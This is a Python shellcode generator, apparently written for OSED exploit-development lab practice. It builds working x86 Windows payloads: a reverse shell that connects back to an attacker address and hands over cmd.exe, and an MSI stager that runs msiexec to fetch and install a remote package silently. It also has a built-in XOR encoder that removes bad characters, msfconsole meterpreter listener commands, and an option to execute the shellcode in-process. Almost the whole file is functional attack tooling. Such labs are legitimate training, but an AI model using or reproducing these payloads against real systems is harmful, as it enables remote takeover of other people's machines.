#!/usr/bin/python3
"""
Shellcode generator for OSED lab VMs (x86 only).

Built-in XOR additive-feedback encoder (-x / --encode) replaces the msfvenom
shikata_ga_nai dependency.  No external tools required post-assembly.
"""

import sys
import os
import argparse
import ctypes
import struct
import platform

try:
    import keystone as ks
except ImportError:
    raise SystemExit("[!] Keystone not installed. Run: pip install keystone-engine")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def to_sin_ip(ip_address):
    ip_addr_hex = [format(int(b), "02x") for b in ip_address.split(".")]
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def to_sin_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + port_hex[2:4] + port_hex[0:2]


def ror_str(byte, count):
    return ((byte >> count) | (byte << (32 - count))) & 0xFFFFFFFF


def push_function_hash(function_name):
    edx = 0x00
    for i, ch in enumerate(function_name):
        edx += ord(ch)
        if i < len(function_name) - 1:
            edx = ror_str(edx, 0xd)
    return "push " + hex(edx)


def push_string(input_string, null_terminate=True):
    """
    Generate x86 NASM to push input_string onto the stack.
    - Explicitly zeroes EAX before partial moves (no hidden caller dependency).
    - null_terminate=True: prepends null push so callers don't need to.
    - 3-byte remainder uses shl to avoid embedded null bytes.
    - Clobbers EAX only.
    """
    hex_payload = input_string.encode().hex()
    hex_len = len(hex_payload)

    instructions = []
    first_instructions = []

    for i in range(hex_len, 0, -1):
        if (i % 8) == 0:
            chunk = hex_payload[i - 8:i]
            dword = chunk[6:8] + chunk[4:6] + chunk[2:4] + chunk[0:2]
            instructions.append(f"push dword 0x{dword};")
        elif i == 1 and (hex_len % 8) != 0:
            remainder = hex_len % 8
            tail = hex_payload[hex_len - remainder:]
            first_instructions.append("xor eax, eax;")
            if remainder == 2:   # 1 byte
                first_instructions.append(f"mov al, 0x{tail[0:2]};")
                first_instructions.append("push eax;")
            elif remainder == 4: # 2 bytes
                first_instructions.append(f"mov ax, 0x{tail[2:4] + tail[0:2]};")
                first_instructions.append("push eax;")
            else:                # 3 bytes: use shifts to avoid embedded null
                first_instructions.append(f"mov al, 0x{tail[4:6]};")
                first_instructions.append("shl eax, 0x08;")
                first_instructions.append(f"mov al, 0x{tail[2:4]};")
                first_instructions.append("shl eax, 0x08;")
                first_instructions.append(f"mov al, 0x{tail[0:2]};")
                first_instructions.append("push eax;")

    null_instr = ["xor eax, eax;", "push eax;"] if null_terminate else []
    return "".join(null_instr + first_instructions + instructions)


def find_function_stub():
    """Kernel32 walker + export-table resolver shared by all three payloads."""
    return [
        "   find_kernel32:                       ",
        "       xor ecx, ecx                    ;",  # ECX = 0
        "       mov esi, fs:[ecx+30h]           ;",  # ESI = &(PEB)
        "       mov esi, [esi+0Ch]              ;",  # ESI = PEB->Ldr
        "       mov esi, [esi+1Ch]              ;",  # ESI = PEB->Ldr.InInitOrder
        "   next_module:                         ",
        "       mov ebx, [esi+8h]              ;",   # EBX = base_address
        "       mov edi, [esi+20h]             ;",   # EDI = module_name
        "       mov esi, [esi]                 ;",   # ESI = flink (next)
        "       cmp [edi+12*2], cx             ;",   # modulename[12] == 0?
        "       jne next_module                ;",
        "   find_function_shorten:              ",
        "       jmp find_function_shorten_bnc  ;",
        "   find_function_ret:                  ",
        "       pop esi                        ;",
        "       mov [ebp+0x04], esi            ;",
        "       jmp resolve_symbols_kernel32   ;",
        "   find_function_shorten_bnc:          ",
        "       call find_function_ret         ;",
        "   find_function:                      ",
        "       pushad                         ;",
        "       mov eax, [ebx+0x3c]            ;",  # PE signature offset
        "       mov edi, [ebx+eax+0x78]        ;",  # Export Table RVA
        "       add edi, ebx                   ;",  # Export Table VMA
        "       mov ecx, [edi+0x18]            ;",  # NumberOfNames
        "       mov eax, [edi+0x20]            ;",  # AddressOfNames RVA
        "       add eax, ebx                   ;",  # AddressOfNames VMA
        "       mov [ebp-4], eax               ;",
        "   find_function_loop:                 ",
        "       jecxz find_function_finished   ;",
        "       dec ecx                        ;",
        "       mov eax, [ebp-4]               ;",
        "       mov esi, [eax+ecx*4]           ;",
        "       add esi, ebx                   ;",
        "   compute_hash:                       ",
        "       xor eax, eax                   ;",
        "       cdq                            ;",
        "       cld                            ;",
        "   compute_hash_again:                 ",
        "       lodsb                          ;",
        "       test al, al                    ;",
        "       jz compute_hash_finished       ;",
        "       ror edx, 0x0d                  ;",
        "       add edx, eax                   ;",
        "       jmp compute_hash_again         ;",
        "   compute_hash_finished:              ",
        "   find_function_compare:              ",
        "       cmp edx, [esp+0x24]            ;",
        "       jnz find_function_loop         ;",
        "       mov edx, [edi+0x24]            ;",  # AddressOfNameOrdinals RVA
        "       add edx, ebx                   ;",
        "       mov cx, [edx+2*ecx]            ;",  # ordinal
        "       mov edx, [edi+0x1c]            ;",  # AddressOfFunctions RVA
        "       add edx, ebx                   ;",
        "       mov eax, [edx+4*ecx]           ;",  # function RVA
        "       add eax, ebx                   ;",  # function VMA
        "       mov [esp+0x1c], eax            ;",  # overwrite pushad's eax slot
        "   find_function_finished:             ",
        "       popad                          ;",
        "       ret                            ;",
    ]


# ---------------------------------------------------------------------------
# Argument validation
# ---------------------------------------------------------------------------

def validate_args(args):
    import ipaddress

    try:
        ipaddress.ip_address(args.lhost)
    except ValueError:
        raise SystemExit(f"[!] Invalid IP address: {args.lhost!r}")

    try:
        port = int(args.lport)
        if not (1 <= port <= 65535):
            raise ValueError()
    except ValueError:
        raise SystemExit(f"[!] Invalid port: {args.lport!r} (must be 1-65535)")

    if args.msi and args.messagebox:
        raise SystemExit("[!] --msi and --messagebox are mutually exclusive")

    if args.messagebox and (args.mb_header is None or args.mb_text is None):
        raise SystemExit("[!] --messagebox requires both --mb-header and --mb-text")

    if args.test_shellcode:
        if platform.system() != "Windows":
            raise SystemExit("[!] --test-shellcode is only supported on Windows")
        if (struct.calcsize("P") * 8) != 32:
            raise SystemExit("[!] --test-shellcode requires a 32-bit Python interpreter")


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    push_instr_terminate    = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya = push_function_hash("LoadLibraryA")
    push_instr_createprocess= push_function_hash("CreateProcessA")
    push_instr_wsastartup   = push_function_hash("WSAStartup")
    push_instr_wsasocketa   = push_function_hash("WSASocketA")
    push_instr_wsaconnect   = push_function_hash("WSAConnect")

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
    ] + find_function_stub() + [
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess
        push_instr_loadlibrarya,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA
        push_instr_createprocess,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA
        "   load_ws2_32:                         ",
        "       xor eax, eax                    ;",
        "       mov ax, 0x6c6c                  ;",
        "       push eax                        ;",  # "ll\0\0"
        "       push 0x642e3233                 ;",  # "32.d"
        "       push 0x5f327377                 ;",  # "ws2_"
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",  # LoadLibraryA("ws2_32.dll")
        "   resolve_symbols_ws2_32:              ",
        "       mov ebx, eax                    ;",  # ws2_32 base
        push_instr_wsastartup,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup
        push_instr_wsasocketa,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x20], eax             ;",  # Save WSASocketA
        push_instr_wsaconnect,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x24], eax             ;",  # Save WSAConnect
        "   call_wsastartup:                    ;",
        "       mov eax, esp                    ;",
        "       xor ecx, ecx                    ;",
        "       mov cx, 0x590                   ;",
        "       sub eax, ecx                    ;",
        "       push eax                        ;",  # lpWSAData
        "       xor eax, eax                    ;",
        "       mov ax, 0x0202                  ;",
        "       push eax                        ;",  # wVersionRequired
        "       call dword ptr [ebp+0x1C]       ;",
        "   call_wsasocketa:                     ",
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # dwFlags
        "       push eax                        ;",  # g
        "       push eax                        ;",  # lpProtocolInfo
        "       mov al, 0x06                    ;",  # IPPROTO_TCP
        "       push eax                        ;",
        "       sub al, 0x05                    ;",  # 0x01
        "       push eax                        ;",  # type = SOCK_STREAM
        "       inc eax                         ;",  # 0x02
        "       push eax                        ;",  # af = AF_INET
        "       call dword ptr [ebp+0x20]       ;",
        "   call_wsaconnect:                     ",
        "       mov esi, eax                    ;",  # SOCKET descriptor
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # sin_zero[]
        "       push eax                        ;",  # sin_zero[]
        f"      push {to_sin_ip(rev_ip_addr)}   ;",  # sin_addr
        f"      mov ax, {to_sin_port(rev_port)} ;",  # sin_port
        "       shl eax, 0x10                   ;",
        "       add ax, 0x02                    ;",  # AF_INET
        "       push eax                        ;",
        "       push esp                        ;",
        "       pop edi                         ;",  # EDI = &sockaddr_in
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpGQOS
        "       push eax                        ;",  # lpSQOS
        "       push eax                        ;",  # lpCalleeData
        "       push eax                        ;",  # lpCallerData
        "       add al, 0x10                    ;",  # namelen = 16
        "       push eax                        ;",
        "       push edi                        ;",  # *name
        "       push esi                        ;",  # s
        "       call dword ptr [ebp+0x24]       ;",
        "   create_startupinfoa:                 ",
        "       push esi                        ;",  # hStdError
        "       push esi                        ;",  # hStdOutput
        "       push esi                        ;",  # hStdInput
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpReserved2
        "       push eax                        ;",  # cbReserved2 & wShowWindow
        "       mov al, 0x80                    ;",
        "       xor ecx, ecx                    ;",
        "       mov cl, 0x80                    ;",
        "       add eax, ecx                    ;",  # dwFlags = 0x100 (STARTF_USESTDHANDLES)
        "       push eax                        ;",
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # dwFillAttribute
        "       push eax                        ;",  # dwYCountChars
        "       push eax                        ;",  # dwXCountChars
        "       push eax                        ;",  # dwYSize
        "       push eax                        ;",  # dwXSize
        "       push eax                        ;",  # dwY
        "       push eax                        ;",  # dwX
        "       push eax                        ;",  # lpTitle
        "       push eax                        ;",  # lpDesktop
        "       push eax                        ;",  # lpReserved
        "       mov al, 0x44                    ;",  # cb = sizeof(STARTUPINFOA)
        "       push eax                        ;",
        "       push esp                        ;",
        "       pop edi                         ;",  # EDI = &STARTUPINFOA
        "   create_cmd_string:                   ",
        "       mov eax, 0xff9a879b             ;",
        "       neg eax                         ;",  # EAX = 0x00657865 ("exe\0")
        "       push eax                        ;",
        "       push 0x2e646d63                 ;",  # "cmd."
        "       push esp                        ;",
        "       pop ebx                         ;",  # EBX = ptr to "cmd.exe"
        "   call_createprocessa:                 ",
        "       mov eax, esp                    ;",
        "       xor ecx, ecx                    ;",
        "       mov cx, 0x390                   ;",
        "       sub eax, ecx                    ;",
        "       push eax                        ;",  # lpProcessInformation
        "       push edi                        ;",  # lpStartupInfo
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpCurrentDirectory
        "       push eax                        ;",  # lpEnvironment
        "       push eax                        ;",  # dwCreationFlags
        "       inc eax                         ;",  # TRUE
        "       push eax                        ;",  # bInheritHandles
        "       dec eax                         ;",
        "       push eax                        ;",  # lpThreadAttributes
        "       push eax                        ;",  # lpProcessAttributes
        "       push ebx                        ;",  # lpCommandLine
        "       push eax                        ;",  # lpApplicationName
        "       call dword ptr [ebp+0x18]       ;",
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",  # uExitCode
        "       push 0xffffffff                 ;",  # hProcess = current
        "       call dword ptr [ebp+0x10]       ;",
    ]
    return "\n".join(asm)


def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    port_part = "" if rev_port == "80" else f":{rev_port}"
    msi_exec_str = f"msiexec /i http://{rev_ip_addr}{port_part}/X /qn"
    pad = (4 - len(msi_exec_str) % 4) % 4
    msi_exec_str += " " * pad

    push_instr_terminate    = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya = push_function_hash("LoadLibraryA")
    push_instr_system       = push_function_hash("system")
    push_instr_msvcrt       = push_string("msvcrt.dll")
    push_instr_msi          = push_string(msi_exec_str)

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",
    ] + find_function_stub() + [
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x10], eax             ;",
        push_instr_loadlibrarya,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x14], eax             ;",
        "   load_msvcrt:                         ",
        push_instr_msvcrt,
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",
        "   resolve_symbols_msvcrt:              ",
        "       mov ebx, eax                    ;",
        push_instr_system,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x18], eax             ;",
        "   call_system:                         ",
        push_instr_msi,
        "       push esp                        ;",
        "       call dword ptr [ebp+0x18]       ;",
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        "       call dword ptr [ebp+0x10]       ;",
    ]
    return "\n".join(asm)


def msg_box(header, text, breakpoint=0):
    push_instr_terminate    = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya = push_function_hash("LoadLibraryA")
    push_instr_msgbox       = push_function_hash("MessageBoxA")
    push_instr_user32       = push_string("user32.dll")
    push_instr_header       = push_string(header)
    push_instr_text         = push_string(text)

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",
    ] + find_function_stub() + [
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x10], eax             ;",
        push_instr_loadlibrarya,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x14], eax             ;",
        "   load_user32:                         ",
        push_instr_user32,
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",
        "   resolve_symbols_user32:              ",
        "       mov ebx, eax                    ;",
        push_instr_msgbox,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x18], eax             ;",
        "   call_messageboxa:                    ",
        push_instr_header,
        "       mov ebx, esp                    ;",  # EBX = lpCaption
        push_instr_text,
        "       mov ecx, esp                    ;",  # ECX = lpText
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # uType = 0
        "       push ebx                        ;",  # lpCaption
        "       push ecx                        ;",  # lpText
        "       push eax                        ;",  # hWnd = NULL
        "       call dword ptr [ebp+0x18]       ;",
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        "       call dword ptr [ebp+0x10]       ;",
    ]
    return "\n".join(asm)


# ---------------------------------------------------------------------------
# Built-in SGN-equivalent encoder
# ---------------------------------------------------------------------------
#
# Decoder stub layout (33 bytes fixed; all opcodes verified clean vs default bad chars):
#
#   offset  bytes              instruction
#   0x00    d9 ee              fldz
#   0x02    d9 74 24 f4        fstenv [esp-0x0c]     FPU env dump; FIP lands at [esp]
#   0x06    59                 pop ecx               ECX = &fldz  (FPU IP = last FP instr)
#   0x07    8d 71 21           lea esi, [ecx+33]     ESI = &encoded_payload
#   0x0a    31 d2              xor edx, edx
#   0x0c    b2 <count>         mov dl, count
#   0x0e    bb <key×4>         mov ebx, key
#   0x13    56                 push esi              save payload ptr for final jmp
#   [decode_loop @ 0x14]:
#   0x14    31 1e              xor [esi], ebx        decode DWORD in-place
#   0x16    03 1e              add ebx, [esi]        additive feedback (decoded value)
#   0x18    83 c6 04           add esi, 4
#   0x1b    4a                 dec edx
#   0x1c    75 f6              jnz decode_loop       rel8 = 0x14-0x1e = -10 = 0xf6
#   0x1e    5e                 pop esi               restore saved payload ptr
#   0x1f    ff e6              jmp esi               jump into decoded shellcode
#   [total = 0x21 = 33 bytes]
#
# Encoding (must mirror decoder exactly):
#   k = initial_key
#   for each plaintext DWORD d[i]:
#       e[i] = d[i] ^ k
#       k    = (k + d[i]) & 0xffffffff     # add PLAINTEXT (decoded) value — matches
#                                           # "add ebx, [esi]" AFTER the xor

_STUB_SIZE = 33

# All bytes in the stub that are not key or count (verified clean vs default bad chars).
# If a user's custom bad char set overlaps these, we raise early instead of producing
# silently broken shellcode.
_FIXED_STUB_BYTE_SET = frozenset([
    0xd9, 0xee, 0x74, 0x24, 0xf4, 0x59,
    0x8d, 0x71, _STUB_SIZE,
    0x31, 0xd2, 0xb2,
    0xbb,
    0x56, 0x1e, 0x03, 0x83, 0xc6, 0x04, 0x4a, 0x75, 0xf6,
    0x5e, 0xff, 0xe6,
])


def _has_bad_chars(data: bytes | bytearray, bad_chars: set[int]) -> bool:
    return any(b in bad_chars for b in data)


def _build_decoder_stub(key: int, count: int) -> bytes:
    assert 1 <= count <= 255
    stub = bytearray()
    stub += b'\xd9\xee'                        # fldz
    stub += b'\xd9\x74\x24\xf4'                # fstenv [esp-0x0c]
    stub += b'\x59'                            # pop ecx
    stub += b'\x8d\x71' + bytes([_STUB_SIZE]) # lea esi, [ecx+33]
    stub += b'\x31\xd2'                        # xor edx, edx
    stub += b'\xb2' + bytes([count])           # mov dl, count
    stub += b'\xbb' + struct.pack('<I', key)   # mov ebx, key
    stub += b'\x56'                            # push esi
    stub += b'\x31\x1e'                        # xor [esi], ebx
    stub += b'\x03\x1e'                        # add ebx, [esi]
    stub += b'\x83\xc6\x04'                    # add esi, 4
    stub += b'\x4a'                            # dec edx
    stub += b'\x75\xf6'                        # jnz decode_loop  (rel8 = -10)
    stub += b'\x5e'                            # pop esi
    stub += b'\xff\xe6'                        # jmp esi
    assert len(stub) == _STUB_SIZE
    return bytes(stub)


def encode_shikata(shellcode: bytearray, bad_chars: set[int],
                   max_attempts: int = 1000) -> bytes:
    """
    XOR additive-feedback encoder with FPU-based GetPC decoder stub.
    Functionally equivalent to:
        msfvenom -e x86/shikata_ga_nai -b '\\x00\\x0a...'

    Returns: decoder_stub (33 bytes) + encoded_payload as one bytes object.

    Limitations vs. full msfvenom SGN:
    - x86 (32-bit) only (matches the rest of the tool).
    - Supports shellcodes up to 1020 bytes (255 DWORDs); larger payloads need
      a 16-bit counter in the stub — not implemented here.
    - No stub polymorphism (fixed opcode sequence). A fixed-signature stub is
      fine for OSED lab use; for AV evasion, layer additional obfuscation.
    - If a custom bad char set conflicts with hardcoded stub bytes (0x04, 0x21,
      0xf6, etc.), encode_shikata raises ValueError immediately with details.
    """
    # --- Pre-flight: detect stub/bad-char conflicts early ---
    conflicts = _FIXED_STUB_BYTE_SET & bad_chars
    if conflicts:
        raise ValueError(
            f"Bad char set conflicts with hardcoded stub bytes: "
            f"{sorted(hex(b) for b in conflicts)}. "
            "Redesign the decoder stub to avoid those bytes."
        )

    # --- Pad payload to DWORD boundary ---
    pad = (4 - len(shellcode) % 4) % 4
    payload = bytes(shellcode) + b'\x90' * pad
    num_dwords = len(payload) // 4

    if num_dwords == 0:
        raise ValueError("Shellcode is empty")
    if num_dwords > 255:
        raise ValueError(
            f"Shellcode too large: {len(shellcode)} bytes ({num_dwords} DWORDs). "
            "Maximum for this stub is 255 DWORDs (1020 bytes)."
        )

    # --- Ensure the DWORD count byte itself is not a bad char ---
    # Append NOP DWORDs (at most 7, since bad chars are sparse).
    while num_dwords in bad_chars:
        payload += b'\x90\x90\x90\x90'
        num_dwords += 1
        if num_dwords > 255:
            raise ValueError(
                "Cannot avoid bad char in DWORD count after padding. "
                "Reduce the bad char set or adjust shellcode size manually."
            )

    # --- Key search ---
    for attempt in range(1, max_attempts + 1):
        key_bytes = os.urandom(4)
        if _has_bad_chars(key_bytes, bad_chars):
            continue
        key = struct.unpack('<I', key_bytes)[0]

        # Encode: e[i] = d[i] ^ k;  k = (k + d[i]) & 0xffffffff
        encoded = bytearray()
        k = key
        for i in range(num_dwords):
            dword = struct.unpack_from('<I', payload, i * 4)[0]
            enc_dword = dword ^ k
            encoded += struct.pack('<I', enc_dword)
            k = (k + dword) & 0xFFFFFFFF

        if _has_bad_chars(encoded, bad_chars):
            continue  # this key produces bad chars in the output; try another

        stub = _build_decoder_stub(key, num_dwords)
        if _has_bad_chars(stub, bad_chars):
            # The variable stub bytes (key+count) landed on a bad char; try again.
            continue

        print(f"[+] Encoding: key=0x{key:08x}  count={num_dwords}  attempt={attempt}")
        return bytes(stub) + bytes(encoded)

    raise RuntimeError(
        f"Could not find a clean encoding after {max_attempts} attempts. "
        "Try a smaller bad char set or increase --encode-attempts."
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main(args):
    validate_args(args)

    if args.msi:
        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break)
        help_msg = (
            f"\t Create MSI payload:\n"
            f"\t\t msfvenom -p windows/meterpreter/reverse_tcp "
            f"LHOST={args.lhost} LPORT=443 -f msi -o X\n"
            f"\t Start HTTP server:\n"
            f"\t\t sudo python -m SimpleHTTPServer {args.lport}\n"
            f"\t Start listener:\n"
            f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; '
            f"set PAYLOAD windows/meterpreter/reverse_tcp; "
            f'set LHOST {args.lhost}; set LPORT 443; exploit"'
        )
        mode = "MSI stager"
    elif args.messagebox:
        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break)
        help_msg = "\t MessageBox payload -- no listener required."
        mode = "MessageBox"
    else:
        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break)
        help_msg = f"\t Start listener:\n\t\t nc -lnvp {args.lport}"
        mode = "reverse shell"

    print(shellcode_asm)

    try:
        eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
        encoding, _ = eng.asm(shellcode_asm)
    except ks.KsError as e:
        raise SystemExit(f"[!] Keystone assembly error: {e}")

    # Parse bad chars into a set of ints once; used everywhere below.
    bad_char_ints: set[int] = set()
    for bad in args.bad_chars:
        try:
            bad_char_ints.add(int(bad, 16))
        except ValueError:
            raise SystemExit(f"[!] Bad char must be hex (e.g. 00 0a), got: {bad!r}")

    # --- Encode if requested ---
    if args.encode:
        print("[*] Running built-in XOR additive-feedback encoder...")
        try:
            encoded_blob = encode_shikata(
                bytearray(encoding), bad_char_ints, args.encode_attempts
            )
        except (ValueError, RuntimeError) as e:
            raise SystemExit(str(e))
        encoding = list(encoded_blob)

    # --- Bad-char check on raw byte values (not the formatted string) ---
    sentry = False
    for b in bad_char_ints:
        if b in encoding:
            print(f"[!] Found bad char 0x{b:02x}")
            sentry = True

    final = 'shellcode = b"' + "".join(f"\\x{enc:02x}" for enc in encoding) + '"'

    if sentry:
        print(f"[=] {final}", file=sys.stderr)
        raise SystemExit("[!] Bad chars detected. Re-run with -x / --encode to strip them.")

    print(f"\n[+] Shellcode ready!")
    print(f"[=]   len:   {len(encoding)} bytes")
    print(f"[=]   lhost: {args.lhost}")
    print(f"[=]   lport: {args.lport}")
    print(f"[=]   break: {['disabled', 'active'][args.debug_break]}")
    print(f"[=]   mode:  {mode}")
    print(f"[=]   enc:   {'shikata_ga_nai (built-in)' if args.encode else 'none'}")

    if args.store_shellcode:
        with open("shellcode.bin", "wb") as f:
            f.write(bytearray(encoding))
        print("[=]   saved: shellcode.bin")

    print("[=]   help:")
    print(help_msg)
    print()
    print(final)

    if args.test_shellcode:
        print("\n[+] Executing shellcode in-process...")
        packed = bytearray(encoding)
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0), ctypes.c_int(len(packed)),
            ctypes.c_int(0x3000), ctypes.c_int(0x40),
        )
        buf = (ctypes.c_char * len(packed)).from_buffer(packed)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed))
        )
        print(f"[=]   shellcode at: {hex(ptr)}")
        input("    [ENTER to execute]")
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
            ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)),
        )
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="x86 shellcode generator for OSED lab VMs -- no msfvenom required",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Reverse shell, check for null bytes only
  %(prog)s -l 192.168.1.10 -p 443

  # Reverse shell, encode to strip all standard bad chars in one step
  %(prog)s -l 192.168.1.10 -p 443 -x

  # MSI stager with custom bad char set, encoded
  %(prog)s -l 192.168.1.10 -p 80 -m -b 00 0a 0d -x

  # MessageBox PoC, unencoded (no bad chars expected)
  %(prog)s --messagebox --mb-header "Pwned" --mb-text "Hello"
        """,
    )
    parser.add_argument("-l", "--lhost",
        help="attacker listen address (default: 127.0.0.1)", default="127.0.0.1")
    parser.add_argument("-p", "--lport",
        help="attacker listen port (default: 4444)", default="4444")
    parser.add_argument("-b", "--bad-chars",
        help="space-separated hex bad chars (default: 00 0a 0d 25 26 2b 3d)",
        default=["00", "0a", "0d", "25", "26", "2b", "3d"], nargs="+")
    parser.add_argument("-m", "--msi",
        help="MSI exploit stager mode", action="store_true")
    parser.add_argument("--messagebox",
        help="MessageBox PoC payload", action="store_true")
    parser.add_argument("--mb-header", help="MessageBox caption text")
    parser.add_argument("--mb-text",   help="MessageBox body text")
    parser.add_argument("-d", "--debug-break",
        help="insert int3 as first instruction", action="store_true")
    parser.add_argument("-x", "--encode",
        help="encode output with built-in XOR additive-feedback encoder "
             "(eliminates bad chars; replaces 'msfvenom -e x86/shikata_ga_nai')",
        action="store_true")
    parser.add_argument("--encode-attempts",
        help="max key search attempts for encoder (default: 1000)",
        type=int, default=1000)
    parser.add_argument("-t", "--test-shellcode",
        help="execute shellcode in-process (Windows 32-bit only)",
        action="store_true")
    parser.add_argument("-s", "--store-shellcode",
        help="write raw bytes to shellcode.bin", action="store_true")

    args = parser.parse_args()
    main(args)
